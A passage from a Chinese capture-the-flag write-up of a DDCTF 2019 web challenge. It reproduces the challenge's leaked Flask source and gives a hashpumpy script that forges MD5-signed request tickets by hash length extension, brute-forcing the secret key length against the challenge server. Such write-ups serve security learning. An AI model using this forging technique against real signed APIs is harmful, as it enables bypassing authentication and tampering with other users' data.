class="string">'X-Powered-By'</span>] = <span class="string">' Servlet/3.0'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    str_md5 = get_md5(user_name, <span class="string">'DDCTF_2019'</span>)</span><br><span class="line">    <span class="keyword">if</span> hash_val != str_md5:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"登陆信息有误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Pay-Server'</span>] = <span class="string">'Apache-Coyote/1.1'</span></span><br><span class="line">        response.headers[<span class="string">'X-Powered-By'</span>] = <span class="string">' Servlet/3.0'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    tmp_obj = mydb.get_collection(<span class="string">'bill'</span>).find_one(&#123;<span class="string">'bill_id'</span>:bill_id&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tmp_obj:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"订单信息有误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Pay-Server'</span>] = <span class="string">'Apache-Coyote/1.1'</span></span><br><span class="line">        response.headers[<span class="string">'X-Powered-By'</span>] = <span class="string">' Servlet/3.0'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    tmp_price = mydb.get_collection(<span class="string">'bill'</span>).find_one(&#123;<span class="string">'user_name'</span>: user_name&#125;)[<span class="string">'ticket_price'</span>]</span><br><span class="line">    tmp_bill_uuid = mydb.get_collection(<span class="string">'bill'</span>).find_one(&#123;<span class="string">'bill_id'</span>: bill_id&#125;)[<span class="string">'bill_id'</span>]</span><br><span class="line">    price = num64_to_32(tmp_price)</span><br><span class="line">    tmp_account = mydb.get_collection(<span class="string">'account'</span>).find_one(&#123;<span class="string">'user_name'</span>: user_name&#125;)[<span class="string">'balance'</span>]</span><br><span class="line">    <span class="keyword">if</span> tmp_bill_uuid == bill_id:</span><br><span class="line">        <span class="keyword">if</span> tmp_account &gt;= price:</span><br><span class="line">            <span class="keyword">if</span> mydb.get_collection(<span class="string">'user_env'</span>).find_one(&#123;<span class="string">'user_name'</span>: user_name&#125;):</span><br><span class="line">                tmp = mydb.get_collection(<span class="string">'user_env'</span>).find_one(&#123;<span class="string">'user_name'</span>: user_name&#125;)[<span class="string">'user_info_list'</span>]</span><br><span class="line">                <span class="keyword">for</span> item <span class="keyword">in</span> tmp:</span><br><span class="line">                    <span class="keyword">if</span> item[<span class="string">'user_name'</span>] == user_name:</span><br><span class="line">                        result.append(item)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"已购买ticket"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">                    response.headers[<span class="string">'Pay-Server'</span>] = <span class="string">'Apache-Coyote/1.1'</span></span><br><span class="line">                    response.headers[<span class="string">'X-Powered-By'</span>] = <span class="string">' Servlet/3.0'</span></span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                account = tmp_account - price</span><br><span class="line">                mydb.get_collection(<span class="string">'account'</span>).update_one(&#123;<span class="string">'user_name'</span>: user_name&#125;, &#123;<span class="string">'$set'</span>: &#123;<span class="string">'balance'</span>: account&#125;&#125;,</span><br><span class="line">                                                          upsert=<span class="literal">True</span>)</span><br><span class="line">                mydb.get_collection(<span class="string">'bill'</span>).delete_one(&#123;<span class="string">'bill_id'</span>: bill_id&#125;)</span><br><span class="line">                tmp_info = creat_env_db(user_name)</span><br><span class="line">                mydb.get_collection(<span class="string">'user_env'</span>).insert_one(tmp_info[<span class="number">0</span>])</span><br><span class="line">                tmp_result = &#123;<span class="string">'your_ticket'</span>: tmp_info[<span class="number">1</span>][<span class="string">'hash_val'</span>], <span class="string">'your_id'</span>: tmp_info[<span class="number">1</span>][<span class="string">'id'</span>]&#125;</span><br><span class="line">                result.append(tmp_result)</span><br><span class="line">                response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"交易成功"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">                response.headers[<span class="string">'Pay-Server'</span>] = <span class="string">'Apache-Coyote/1.1'</span></span><br><span class="line">                response.headers[<span class="string">'X-Powered-By'</span>] = <span class="string">' Servlet/3.0'</span></span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"余额不足"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">            response.headers[<span class="string">'Pay-Server'</span>] = <span class="string">'Apache-Coyote/1.1'</span></span><br><span class="line">            response.headers[<span class="string">'X-Powered-By'</span>] = <span class="string">' Servlet/3.0'</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"订单信息有误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Pay-Server'</span>] = <span class="string">'Apache-Coyote/1.1'</span></span><br><span class="line">        response.headers[<span class="string">'X-Powered-By'</span>] = <span class="string">' Servlet/3.0'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_login</span><span class="params">()</span>:</span></span><br><span class="line">    user_name = request.cookies.get(<span class="string">'user_name'</span>)</span><br><span class="line">    hash_val = request.cookies.get(<span class="string">'REVEL_SESSION'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_name <span class="keyword">or</span> <span class="keyword">not</span> hash_val:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数不能为空"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    str_md5 = get_md5(user_name, <span class="string">'DDCTF_2019'</span>)</span><br><span class="line">    <span class="keyword">if</span> hash_val != str_md5:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"登陆信息有误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"您已登陆"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    user_name = request.cookies.get(<span class="string">'user_name'</span>)</span><br><span class="line">    hash_val = request.cookies.get(<span class="string">'REVEL_SESSION'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_name <span class="keyword">or</span> <span class="keyword">not</span> hash_val:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数不能为空"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    str_md5 = get_md5(user_name, <span class="string">'DDCTF_2019'</span>)</span><br><span class="line">    <span class="keyword">if</span> hash_val != str_md5:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"登陆信息有误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    tmp = mydb.get_collection(<span class="string">'user_env'</span>).find_one(&#123;<span class="string">'user_name'</span>: user_name&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tmp:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"你还未获取入场券"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tmp:</span><br><span class="line">        tmp_dic = &#123;<span class="string">'ticket'</span>: tmp[<span class="string">'player_info'</span>][<span class="string">'hash_val'</span>], <span class="string">'id'</span>: tmp[<span class="string">'player_info'</span>][<span class="string">'id'</span>]&#125;</span><br><span class="line">        result.append(tmp_dic)</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"ticket信息"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_robot</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    sign_str = <span class="string">''</span></span><br><span class="line">    user_name = request.cookies.get(<span class="string">'user_name'</span>)</span><br><span class="line">    hash_val = request.cookies.get(<span class="string">'REVEL_SESSION'</span>)</span><br><span class="line">    a = request.environ[<span class="string">'QUERY_STRING'</span>]</span><br><span class="line">    params_list = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> a.split(<span class="string">'&amp;'</span>):</span><br><span class="line">        k, v = item.split(<span class="string">'='</span>)</span><br><span class="line">        params_list.append((k, v))</span><br><span class="line"></span><br><span class="line">    user_id = request.args.get(<span class="string">'id'</span>)</span><br><span class="line">    ticket = request.args.get(<span class="string">'ticket'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_name <span class="keyword">or</span> <span class="keyword">not</span> hash_val <span class="keyword">or</span> <span class="keyword">not</span> user_id <span class="keyword">or</span> <span class="keyword">not</span> ticket:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数错误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if not str.isdigit(user_id):</span></span><br><span class="line">    <span class="comment">#     return jsonify(&#123;"code": 0, "msg": "参数错误", "data": []&#125;)</span></span><br><span class="line"></span><br><span class="line">    str_md5 = get_md5(user_name, <span class="string">'DDCTF_2019'</span>)</span><br><span class="line">    <span class="keyword">if</span> hash_val != str_md5:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"登陆信息有误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    find_result = mydb.get_collection(<span class="string">'user_env'</span>).find_one(&#123;<span class="string">'user_name'</span>: user_name&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> find_result:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"未购买ticket"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> params_list:</span><br><span class="line">        <span class="keyword">if</span> item[<span class="number">0</span>] == <span class="string">'ticket'</span>:</span><br><span class="line">            params_list.remove(item)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> params_list:</span><br><span class="line">        sign_str = sign_str + unquote(item[<span class="number">0</span>]) + unquote(item[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">print</span> sign_str</span><br><span class="line">    sign_str_md5 = get_md5(sign_str, secrity_key)</span><br><span class="line">    <span class="keyword">print</span> len(secrity_key)</span><br><span class="line">    <span class="keyword">print</span> sign_str</span><br><span class="line">    print(sign_str_md5)</span><br><span class="line">    <span class="keyword">print</span> ticket</span><br><span class="line">    <span class="keyword">if</span> sign_str_md5 != ticket:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数错误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> find_result[<span class="string">'player_info'</span>][<span class="string">'id'</span>] == int(user_id):</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"参数检查正确，但你不能将你自己移除"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    tmp_list = find_result[<span class="string">'user_info_list'</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> tmp_list:</span><br><span class="line">        <span class="keyword">if</span> item[<span class="string">'id'</span>] == int(user_id):</span><br><span class="line">            rm_robot = &#123;<span class="string">'robot_name'</span>: item[<span class="string">'user_name'</span>], <span class="string">'id'</span>: item[<span class="string">'id'</span>], <span class="string">'robot_ticket'</span>: item[<span class="string">'hash_val'</span>]&#125;</span><br><span class="line">            result.append(rm_robot)</span><br><span class="line">            tmp_list.remove(item)</span><br><span class="line">    mydb.get_collection(<span class="string">'user_env'</span>).update_one(&#123;<span class="string">'user_name'</span>: user_name&#125;, &#123;<span class="string">'$set'</span>: &#123;<span class="string">'user_info_list'</span>: tmp_list&#125;&#125;,</span><br><span class="line">                                               upsert=<span class="literal">True</span>)</span><br><span class="line">    response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"移除一个机器人玩家"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">    response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    user_name = request.cookies.get(<span class="string">'user_name'</span>)</span><br><span class="line">    hash_val = request.cookies.get(<span class="string">'REVEL_SESSION'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_name <span class="keyword">or</span> <span class="keyword">not</span> hash_val:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数错误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    str_md5 = get_md5(user_name, <span class="string">'DDCTF_2019'</span>)</span><br><span class="line">    <span class="keyword">if</span> hash_val != str_md5:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"登陆信息有误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    tmp_result = mydb.get_collection(<span class="string">'user_env'</span>).find_one(&#123;<span class="string">'user_name'</span>:user_name&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tmp_result:</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">404</span>, <span class="string">"msg"</span>: <span class="string">"参数错误"</span>, <span class="string">"data"</span>: []&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    tmp_list = tmp_result[<span class="string">'user_info_list'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(tmp_list) != <span class="number">1</span>:</span><br><span class="line">        result.append(len(tmp_list))</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"还有剩余的机器人未淘汰"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tmp_list[<span class="number">0</span>][<span class="string">'user_name'</span>] == user_name:</span><br><span class="line">        result.append(flag)</span><br><span class="line">        response = jsonify(&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"msg"</span>: <span class="string">"大吉大利，今晚吃鸡"</span>, <span class="string">"data"</span>: result&#125;)</span><br><span class="line">        response.headers[<span class="string">'Server'</span>] = <span class="string">'Caddy'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

<p>看到移除机器人这一段代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">def remove_robot():</span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    sign_str = &apos;&apos;</span><br><span class="line">    user_name = request.cookies.get(&apos;user_name&apos;)</span><br><span class="line">    hash_val = request.cookies.get(&apos;REVEL_SESSION&apos;)</span><br><span class="line">    a = request.environ[&apos;QUERY_STRING&apos;]</span><br><span class="line">    params_list = []</span><br><span class="line">    for item in a.split(&apos;&amp;&apos;):</span><br><span class="line">        k, v = item.split(&apos;=&apos;)</span><br><span class="line">        params_list.append((k, v))</span><br><span class="line"></span><br><span class="line">    user_id = request.args.get(&apos;id&apos;)</span><br><span class="line">    ticket = request.args.get(&apos;ticket&apos;)</span><br><span class="line"></span><br><span class="line">    if not user_name or not hash_val or not user_id or not ticket:</span><br><span class="line">        response = jsonify(&#123;&quot;code&quot;: 404, &quot;msg&quot;: &quot;参数错误&quot;, &quot;data&quot;: []&#125;)</span><br><span class="line">        response.headers[&apos;Server&apos;] = &apos;Caddy&apos;</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">    # if not str.isdigit(user_id):</span><br><span class="line">    #     return jsonify(&#123;&quot;code&quot;: 0, &quot;msg&quot;: &quot;参数错误&quot;, &quot;data&quot;: []&#125;)</span><br><span class="line"></span><br><span class="line">    str_md5 = get_md5(user_name, &apos;DDCTF_2019&apos;)</span><br><span class="line">    if hash_val != str_md5:</span><br><span class="line">        response = jsonify(&#123;&quot;code&quot;: 404, &quot;msg&quot;: &quot;登陆信息有误&quot;, &quot;data&quot;: []&#125;)</span><br><span class="line">        response.headers[&apos;Server&apos;] = &apos;Caddy&apos;</span><br><span class="line">        return response</span><br><span class="line">    find_result = mydb.get_collection(&apos;user_env&apos;).find_one(&#123;&apos;user_name&apos;: user_name&#125;)</span><br><span class="line">    if not find_result:</span><br><span class="line">        response = jsonify(&#123;&quot;code&quot;: 404, &quot;msg&quot;: &quot;未购买ticket&quot;, &quot;data&quot;: []&#125;)</span><br><span class="line">        response.headers[&apos;Server&apos;] = &apos;Caddy&apos;</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">    for item in params_list:</span><br><span class="line">        if item[0] == &apos;ticket&apos;:</span><br><span class="line">            params_list.remove(item)</span><br><span class="line">    for item in params_list:</span><br><span class="line">        sign_str = sign_str + unquote(item[0]) + unquote(item[1])</span><br><span class="line">        print sign_str</span><br><span class="line">    sign_str_md5 = get_md5(sign_str, secrity_key)</span><br><span class="line">    print len(secrity_key)</span><br><span class="line">    print sign_str</span><br><span class="line">    print(sign_str_md5)</span><br><span class="line">    print ticket</span><br><span class="line">    if sign_str_md5 != ticket:</span><br><span class="line">        response = jsonify(&#123;&quot;code&quot;: 404, &quot;msg&quot;: &quot;参数错误&quot;, &quot;data&quot;: []&#125;)</span><br><span class="line">        response.headers[&apos;Server&apos;] = &apos;Caddy&apos;</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">    if find_result[&apos;player_info&apos;][&apos;id&apos;] == int(user_id):</span><br><span class="line">        response = jsonify(&#123;&quot;code&quot;: 200, &quot;msg&quot;: &quot;参数检查正确，但你不能将你自己移除&quot;, &quot;data&quot;: []&#125;)</span><br><span class="line">        response.headers[&apos;Server&apos;] = &apos;Caddy&apos;</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">    tmp_list = find_result[&apos;user_info_list&apos;]</span><br><span class="line">    for item in tmp_list:</span><br><span class="line">        if item[&apos;id&apos;] == int(user_id):</span><br><span class="line">            rm_robot = &#123;&apos;robot_name&apos;: item[&apos;user_name&apos;], &apos;id&apos;: item[&apos;id&apos;], &apos;robot_ticket&apos;: item[&apos;hash_val&apos;]&#125;</span><br><span class="line">            result.append(rm_robot)</span><br><span class="line">            tmp_list.remove(item)</span><br><span class="line">    mydb.get_collection(&apos;user_env&apos;).update_one(&#123;&apos;user_name&apos;: user_name&#125;, &#123;&apos;$set&apos;: &#123;&apos;user_info_list&apos;: tmp_list&#125;&#125;,</span><br><span class="line">                                               upsert=True)</span><br><span class="line">    response = jsonify(&#123;&quot;code&quot;: 200, &quot;msg&quot;: &quot;移除一个机器人玩家&quot;, &quot;data&quot;: result&#125;)</span><br><span class="line">    response.headers[&apos;Server&apos;] = &apos;Caddy&apos;</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure>

<p><code>ticket</code>的值是<code>get_md5(sign_str+secrity_key)</code>,而<code>sign_str</code>为<code>request.environ[&#39;QUERY_STRING&#39;]</code>除去ticket之后的键值相加<br>比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.51.147.155:5050/ctf/api/remove_robot?xxxx=&amp;id=62&amp;ticket=35c26fc4f394c54e934379cb8d80ed85</span><br></pre></td></tr></table></figure>

<p>那么获取的<code>sign_str</code>就为<code>xxxxid62</code>,可以通过增加get请求的变量改变<code>sign_str</code>来达到哈希扩展攻击的目的</p>
<p>未知secrity_key长度，通过刚开始买票的id,ticket验证爆破长度<br>参考<a href="web.jarvisoj.com:32778/index.php" target="_blank" rel="noopener">web.jarvisoj.com:32778/index.php</a>的WP<br>我看的是这个<a href="https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote_plus</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=imtinmin1&amp;password=12345678"</span>)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hash</span><span class="params">(hash,org,add,len)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    tmp = hashpumpy.hashpump(hash,org,add,len)</span><br><span class="line">    hash = tmp[<span class="number">0</span>]</span><br><span class="line">    hex_str = tmp[<span class="number">1</span>]</span><br><span class="line">    url_str = quote_plus(hex_str)</span><br><span class="line">    result.append(hash)</span><br><span class="line">    result.append(hex_str)</span><br><span class="line">    result.append(url_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        m = get_hash(<span class="string">'35c26fc4f394c54e934379cb8d80ed85'</span>,<span class="string">'id62'</span>,<span class="string">'id62'</span>,i)</span><br><span class="line">        tic = m[<span class="number">0</span>]</span><br><span class="line">        msg = m[<span class="number">2</span>].rstrip(<span class="string">'id62'</span>)</span><br><span class="line">        <span class="keyword">print</span> tic</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line">        r = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?&#123;&#125;=&amp;id=62&amp;ticket=&#123;&#125;"</span>.format(msg,tic))</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> json.loads(r.text)[<span class="string">'code'</span>] == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'success'</span></span><br><span class="line">            <span class="keyword">print</span> r.text+json.loads(r.text)[<span class="string">'msg'</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>跑出来13</p>
<p>然后遍历<code>id=1 ~ 150</code></p>
